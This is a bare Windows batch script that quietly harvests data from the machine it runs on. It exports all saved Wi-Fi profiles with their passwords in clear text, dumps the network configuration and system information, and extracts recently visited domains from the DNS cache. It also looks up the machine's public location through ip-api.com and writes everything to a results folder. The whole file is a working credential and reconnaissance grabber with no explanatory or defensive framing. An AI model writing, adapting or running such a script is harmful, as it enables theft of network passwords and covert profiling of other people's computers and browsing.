@echo off
mkdir results
start /min netsh wlan export profile folder=results key=clear
ipconfig /all > results\ip.txt
for /f "delims=: tokens=2" %%i in ('ipconfig /displaydns^|find "Record Name"') do (find "%%i" /i history.txt >nul 2>&1|| echo %%i >> results\history.txt)
timeout /nobreak 5 >nul 2>&1
sort results\history.txt /o results\history.txt
wmic os get version > results\version.txt
powershell /command "(Invoke-WebRequest -Uri 'http://ip-api.com/line').Content" > results\country.txt
systeminfo > results\info.txt
exit
